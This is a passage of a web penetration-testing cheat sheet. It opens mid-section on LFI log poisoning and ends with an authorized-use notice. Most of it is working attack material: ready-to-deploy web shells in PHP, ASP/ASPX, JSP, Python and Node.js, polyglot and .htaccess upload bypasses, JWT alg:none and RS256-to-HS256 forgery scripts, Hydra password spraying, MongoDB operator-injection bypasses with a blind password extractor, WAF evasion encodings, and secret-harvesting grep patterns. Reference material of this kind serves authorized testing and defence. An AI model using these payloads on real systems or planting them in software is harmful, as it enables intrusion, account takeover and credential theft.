http://target.com/vuln.php?page=../../../var/log/apache2/access.log&cmd=id
http://target.com/vuln.php?page=../../../var/log/nginx/access.log&cmd=id
```

When to use: Chain LFI with writable log files. The PHP code injected via User-Agent header gets stored in the access log. When the log is included via LFI, the PHP executes with the web server's permissions.

#### Alternative Poison Vectors

```bash
# Via SSH auth log (if accessible and SSH attempted)
ssh '<?php system($_GET["cmd"]); ?>'@target.com
# Then include /var/log/auth.log

# Via mail log
# Send email to local user with PHP in subject/body
# Then include /var/log/mail.log

# Via /proc/self/environ (User-Agent in environment)
# Set User-Agent to PHP payload, include /proc/self/environ
```

---

## SECTION 8: FILE UPLOAD ATTACKS

**References:** CWE-434, OWASP A04:2021 (Insecure Design)

### 8.1 Basic Web Shells via Upload

```php
<!-- shell.php -->
<?php system($_GET['cmd']); ?>

<!-- shell.php — one-liner with response -->
<?php echo shell_exec($_GET['cmd']); ?>

<!-- Minimal shell -->
<?=`$_GET[0]`?>
```

---

### 8.2 Polyglot GIF89a + PHP

```php
GIF89a;
<?php system($_GET['cmd']); ?>
```

Save as `shell.gif` or `shell.gif.php`. The `GIF89a` header passes magic byte validation for GIF files.

#### Polyglot PNG + PHP

```bash
# Create a valid PNG with PHP embedded in metadata
# Using exiftool:
exiftool -Comment='<?php system($_GET["cmd"]); ?>' legit.png
mv legit.png shell.png.php

# Or create minimal PNG with PHP after IEND:
cp legit.png shell.png
echo '<?php system($_GET["cmd"]); ?>' >> shell.png
```

---

### 8.3 .phar Upload

```php
<?php
// generate_phar.php — run locally to create shell.phar
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
```

When to use: If `.php` is blocked but `.phar` is allowed or not filtered. Include via `phar://` wrapper or direct access if Apache/Nginx processes `.phar` as PHP.

---

### 8.4 .htaccess Upload

```apache
# .htaccess — make .evil files execute as PHP
AddType application/x-httpd-php .evil

# Or — make all files in directory execute as PHP
SetHandler application/x-httpd-php

# Or — make specific extension executable
AddHandler php-script .txt
```

Upload `.htaccess` first, then upload `shell.evil` (or `shell.txt`) containing PHP code.

When to use: Apache with `AllowOverride` enabled. Upload `.htaccess` to the same directory as your shell to force PHP execution on arbitrary extensions.

---

### 8.5 IIS Semicolon Bypass

```
shell.asp;.jpg
shell.asp;anything.jpg
shell.aspx;.png
```

When to use: IIS versions that parse the filename up to the semicolon. The server executes `shell.asp` while the filename validation sees `.jpg`.

---

### 8.6 Nginx Path Info / Null Byte

```
# Upload image.jpg (containing PHP code)
# Access via path info:
http://target.com/uploads/image.jpg/anything.php
http://target.com/uploads/image.jpg/.php

# Null byte (older PHP + Nginx)
http://target.com/uploads/image.jpg%00.php
```

When to use: Nginx with `cgi.fix_pathinfo=1` (default in many PHP-FPM configs). The server passes `.php` to the PHP handler, which processes the image file as PHP.

---

### 8.7 Double Extension and Other Tricks

```
# Double extension (misconfigured Apache)
shell.php.jpg
shell.php.png
shell.php5
shell.phtml
shell.pht
shell.phps
shell.php7
shell.pHp

# Case variation
shell.PhP
shell.pHP
shell.Php

# Trailing characters
shell.php.
shell.php...
shell.php%20
shell.php%0a
shell.php%0d%0a

# Content-Type manipulation
# Upload .php but set Content-Type: image/jpeg in the multipart form

# Magic bytes + PHP
# Prepend JPEG magic bytes: \xFF\xD8\xFF\xE0 to PHP shell
printf '\xFF\xD8\xFF\xE0<?php system($_GET["cmd"]); ?>' > shell.php.jpg
```

---

## SECTION 9: WEB SHELLS

**References:** CWE-553, MITRE T1505.003

> **Note:** Web shells are used during authorized penetration tests to verify code execution after a successful upload or injection. Always remove shells after testing.

### 9.1 PHP Web Shells

#### One-Liners

```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
<?php echo `$_GET[cmd]`; ?>
<?=`$_GET[0]`?>
<?php @eval($_POST['cmd']); ?>
```

#### Full-Featured PHP Shell

```php
<?php
if(isset($_REQUEST['cmd'])){
    $cmd = $_REQUEST['cmd'];
    echo '<pre>';
    echo htmlspecialchars(shell_exec($cmd));
    echo '</pre>';
}
if(isset($_FILES['f'])){
    move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']);
    echo 'Uploaded: ' . $_FILES['f']['name'];
}
?>
<form method="POST">
<input name="cmd" size="80" value="id">
<input type="submit" value="Run">
</form>
<form method="POST" enctype="multipart/form-data">
<input name="f" type="file">
<input type="submit" value="Upload">
</form>
```

---

### 9.2 ASP / ASPX Web Shells

#### ASP One-Liner

```asp
<% Set o = Server.CreateObject("WSCRIPT.SHELL") : Set r = o.Exec("cmd /c " & Request("cmd")) : Response.Write(r.StdOut.ReadAll) %>
```

#### ASPX One-Liner

```aspx
<%@ Page Language="C#" %><%System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("cmd","/c " + Request["cmd"]){RedirectStandardOutput=true,UseShellExecute=false}).StandardOutput.ReadToEnd()%>
```

#### ASPX Full Shell

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load(object s, EventArgs e) {
    if (Request["cmd"] != null) {
        ProcessStartInfo psi = new ProcessStartInfo("cmd", "/c " + Request["cmd"]);
        psi.RedirectStandardOutput = true;
        psi.UseShellExecute = false;
        Process p = Process.Start(psi);
        output.Text = "<pre>" + Server.HtmlEncode(p.StandardOutput.ReadToEnd()) + "</pre>";
    }
}
</script>
<form runat="server">
<asp:TextBox id="cmd" runat="server" Width="400"/>
<asp:Button runat="server" Text="Run" OnClick="Page_Load"/>
<asp:Literal id="output" runat="server"/>
</form>
```

---

### 9.3 JSP Web Shell

#### One-Liner

```jsp
<%= Runtime.getRuntime().exec(request.getParameter("cmd")) %>
```

#### Full JSP Shell

```jsp
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    out.print("<pre>");
    while ((line = br.readLine()) != null) out.println(line);
    out.print("</pre>");
}
%>
<form method="GET">
<input name="cmd" size="80" value="id">
<input type="submit" value="Run">
</form>
```

---

### 9.4 Python Web Shell (CGI / WSGI)

```python
#!/usr/bin/env python3
import subprocess, cgi
print("Content-Type: text/html\n")
form = cgi.FieldStorage()
cmd = form.getvalue('cmd', 'id')
print(f"<pre>{subprocess.getoutput(cmd)}</pre>")
print('<form><input name="cmd" size="80"><input type="submit"></form>')
```

---

### 9.5 Node.js Web Shell

```javascript
// Save as shell.js — run with: node shell.js
const http = require('http');
const { execSync } = require('child_process');
http.createServer((req, res) => {
    const cmd = new URL(req.url, 'http://localhost').searchParams.get('cmd');
    if (cmd) {
        try {
            res.end(`<pre>${execSync(cmd).toString()}</pre>`);
        } catch(e) {
            res.end(`<pre>Error: ${e.stderr?.toString()}</pre>`);
        }
    } else {
        res.end('<form><input name="cmd" size="80"><input type="submit"></form>');
    }
}).listen(8080);
```

---

## SECTION 10: AUTH BYPASS & CREDENTIAL ATTACKS

**References:** CWE-287, CWE-798, OWASP A07:2021 (Identification and Authentication Failures), MITRE T1078

### 10.1 Default Credentials — Top 20

| Service | Username | Password |
|---------|----------|----------|
| SSH/FTP | root | root |
| SSH/FTP | admin | admin |
| SSH/FTP | admin | password |
| Tomcat | tomcat | tomcat |
| Tomcat | admin | s3cret |
| Jenkins | admin | admin |
| WordPress | admin | admin |
| phpMyAdmin | root | (empty) |
| phpMyAdmin | root | root |
| MySQL | root | (empty) |
| PostgreSQL | postgres | postgres |
| MongoDB | (no auth) | (no auth) |
| Redis | (no auth) | (no auth) |
| Elasticsearch | (no auth) | (no auth) |
| MSSQL | sa | sa |
| Oracle | system | oracle |
| Grafana | admin | admin |
| Kibana | elastic | changeme |
| RabbitMQ | guest | guest |
| Cisco | cisco | cisco |

When to use: Always test default credentials before attempting brute force. Many services ship with well-known defaults that administrators fail to change.

---

### 10.2 Authentication Field Enumeration

```bash
# Username enumeration via timing difference
# Valid user → slow response (password check), invalid → fast response (user not found)

# Username enumeration via response difference
curl -s -o /dev/null -w "%{http_code} %{size_download}" \
  -d "username=admin&password=wrong" http://target.com/login

curl -s -o /dev/null -w "%{http_code} %{size_download}" \
  -d "username=nonexistent&password=wrong" http://target.com/login

# Compare response size, status code, response time, error messages
# "Invalid password" vs "User not found" = enumerable
# Same message but different response time = timing-based enumeration

# Common username fields to test
username, user, email, login, userid, user_id, uname, account
```

---

### 10.3 JWT Algorithm Confusion — alg:none

```python
# JWT with algorithm set to "none" — signature not verified
import base64, json

header = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({"sub":"admin","role":"admin","iat":1700000000}).encode()).rstrip(b'=')
token = header.decode() + '.' + payload.decode() + '.'
print(token)
```

```bash
# Manual construction
echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '='
echo -n '{"sub":"admin","role":"admin"}' | base64 -w0 | tr '+/' '-_' | tr -d '='
# Concatenate: header.payload.
# Note the trailing dot (empty signature)
```

When to use: Some JWT libraries accept `"alg":"none"` and skip signature verification entirely. Always test this first — it's a trivial bypass when present.

---

### 10.4 JWT RS256 → HS256 Key Confusion

```python
# If the server uses RS256 (asymmetric), try HS256 (symmetric) with the public key
# The server verifies HS256 using the public key as the HMAC secret
import jwt  # pip install PyJWT

# Obtain the server's public key (from /jwks.json, /.well-known/jwks.json, etc.)
public_key = open('public_key.pem', 'r').read()

# Forge token signed with HS256 using the public key as secret
forged = jwt.encode(
    {"sub": "admin", "role": "admin"},
    public_key,
    algorithm="HS256"
)
print(forged)
```

```bash
# Find public keys
curl http://target.com/.well-known/jwks.json
curl http://target.com/jwks.json
curl http://target.com/.well-known/openid-configuration
# Convert JWK to PEM if needed
```

When to use: When the application's JWT library does not enforce the expected algorithm. The attacker signs with HS256 using the (known) public key, and the server incorrectly verifies it.

---

### 10.5 Credential Spray

```bash
# Spray a single password across many usernames (avoids lockout)
# Common spray passwords:
# Password1, Password123, Company2024, Welcome1, Summer2024, Winter2024
# <CompanyName>2024, <Season><Year>, P@ssw0rd

# Hydra — HTTP POST form
hydra -L users.txt -p 'Password1' target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"

# Hydra — Basic Auth
hydra -L users.txt -p 'Password1' target.com http-get /admin

# Rate limiting: 1 attempt per user per 30 minutes to avoid lockout
# Many policies lock after 3-5 failures per account within 15-30 minutes
```

---

### 10.6 NoSQL Authentication Bypass

#### MongoDB Operator Injection

```json
// Bypass login where backend uses: db.users.find({username: input, password: input})
// POST /login Content-Type: application/json
{"username": "admin", "password": {"$ne": ""}}
{"username": "admin", "password": {"$gt": ""}}
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}
{"username": {"$in": ["admin", "administrator"]}, "password": {"$ne": ""}}
```

#### URL-Encoded Operator Injection

```
username=admin&password[$ne]=wrong
username=admin&password[$gt]=
username[$ne]=invalid&password[$ne]=invalid
username[$regex]=^adm&password[$ne]=
```

---

### 10.7 NoSQL Blind Data Extraction

```python
# Extract password character by character using $regex
import requests

url = "http://target.com/login"
password = ""
chars = "abcdefghijklmnopqrstuvwxyz0123456789"

for i in range(32):  # assume max 32 chars
    found = False
    for c in chars:
        payload = {
            "username": "admin",
            "password": {"$regex": f"^{password}{c}"}
        }
        r = requests.post(url, json=payload)
        if "Welcome" in r.text or r.status_code == 302:
            password += c
            print(f"Found: {password}")
            found = True
            break
    if not found:
        break

print(f"Password: {password}")
```

When to use: When NoSQL operator injection works but the password itself is needed (e.g., for credential reuse testing on other services).

---

## APPENDIX A: WAF BYPASS ENCODING REFERENCE

### URL Encoding Layers

```
# Single encoding
< = %3C    > = %3E    ' = %27    " = %22
/ = %2F    \ = %5C    space = %20 or +

# Double encoding (when app decodes twice)
< = %253C    > = %253E    ' = %2527

# Unicode encoding
< = %u003C    > = %u003E

# HTML entity encoding
< = &lt;    > = &gt;    ' = &#39;    " = &quot;
< = &#x3C;    > = &#x3E;    ' = &#x27;

# Mixed encoding
%3Cscript%3Ealert(1)%3C/script%3E
%253Cscript%253Ealert(1)%253C%252Fscript%253E
```

### Case and Whitespace Tricks

```
# Case mixing
SeLeCt, uNiOn, ScRiPt, OnErRoR

# Whitespace alternatives (SQL)
/**/  %09  %0a  %0b  %0c  %0d  %a0

# Whitespace alternatives (command injection)
${IFS}  $IFS  {cmd,arg}  %09  <  <>

# Comment insertion (SQL)
UN/**/ION/**/SE/**/LECT
/*!50000UNION*//*!50000SELECT*/
```

---

## APPENDIX B: JAVASCRIPT SECRETS EXTRACTION

### Regex Patterns for JS Secret Discovery

```bash
# API keys
grep -rEo '(api[_-]?key|apikey)["\s:=]+["\x27][A-Za-z0-9_\-]{16,}["\x27]' *.js

# AWS keys
grep -rEo 'AKIA[0-9A-Z]{16}' *.js
grep -rEo '["\x27][A-Za-z0-9/+=]{40}["\x27]' *.js

# Google API
grep -rEo 'AIza[0-9A-Za-z_\-]{35}' *.js

# GitHub tokens
grep -rEo 'gh[pousr]_[A-Za-z0-9_]{36,}' *.js

# JWT / Bearer tokens
grep -rEo 'eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*' *.js
grep -rEo 'Bearer\s+[A-Za-z0-9_\-\.]+' *.js

# Private keys
grep -rEl 'BEGIN (RSA |EC |DSA )?PRIVATE KEY' *.js

# Generic secrets
grep -rEo '(secret|token|password|passwd|pwd|key)["\s:=]+["\x27][^\s"'\'']{8,}["\x27]' *.js

# Slack tokens
grep -rEo 'xox[baprs]-[0-9]{10,}-[A-Za-z0-9-]+' *.js

# Internal URLs
grep -rEo 'https?://[a-zA-Z0-9._-]*internal[a-zA-Z0-9._/-]*' *.js
grep -rEo 'https?://10\.[0-9.]+[^\s"'\'']*' *.js
grep -rEo 'https?://192\.168\.[0-9.]+[^\s"'\'']*' *.js
grep -rEo 'https?://172\.(1[6-9]|2[0-9]|3[01])\.[0-9.]+[^\s"'\'']*' *.js
```

When to use: Run these against all JavaScript files loaded by the application. Check main bundles, webpack chunks, source maps (.js.map), and inline scripts. Source maps are especially valuable as they contain the original unminified source.

---

## APPENDIX C: HIDDEN FORM AND PARAMETER DISCOVERY

### HTML Form Discovery

```bash
# Extract all forms and their fields
curl -s http://target.com/ | grep -oP '<form[^>]*>.*?</form>'
curl -s http://target.com/ | grep -oP '<input[^>]*>'
curl -s http://target.com/ | grep -oP 'name="[^"]*"'

# Hidden fields specifically
curl -s http://target.com/ | grep -oP '<input[^>]*type="hidden"[^>]*>'
```

### Parameter Discovery Techniques

```bash
# Common hidden parameters to test
debug, test, admin, internal, verbose, source, redirect, url, next, return
callback, jsonp, format, output, mode, action, method, _method, override
role, isadmin, is_admin, access_level, privilege, group, auth, authorize

# Arjun — automated parameter discovery
arjun -u http://target.com/endpoint -m GET
arjun -u http://target.com/endpoint -m POST
arjun -u http://target.com/endpoint -m JSON

# ParamSpider — mine parameters from web archives
paramspider -d target.com

# Check robots.txt, sitemap.xml, crossdomain.xml
curl http://target.com/robots.txt
curl http://target.com/sitemap.xml
curl http://target.com/crossdomain.xml
curl http://target.com/.well-known/security.txt
```

### JavaScript Endpoint Extraction

```bash
# Extract endpoints from JS files
grep -rEo '["'\''](/[a-zA-Z0-9_/.-]+)["'\'']' *.js | sort -u
grep -rEo '["'\''](https?://[^"'\'']+)["'\'']' *.js | sort -u

# Extract API paths
grep -rEo '/api/[a-zA-Z0-9_/.-]+' *.js | sort -u
grep -rEo '/v[0-9]+/[a-zA-Z0-9_/.-]+' *.js | sort -u

# Common config/debug endpoints
/.env
/.git/config
/debug
/trace
/actuator
/actuator/health
/actuator/env
/server-status
/server-info
/.DS_Store
/backup
/config.json
/package.json
/composer.json
/info.php
/phpinfo.php
```

---

> **Responsible Use Notice:** This document is a reference for authorized security professionals conducting lawful penetration tests under written agreement. Techniques documented here are sourced from publicly available security research, OWASP, CWE, CVE databases, and open-source tools. Using these techniques against systems without explicit authorization is illegal under the Computer Fraud and Abuse Act (18 U.S.C. § 1030), the UK Computer Misuse Act 1990, and equivalent legislation in other jurisdictions. Always obtain written authorization before testing.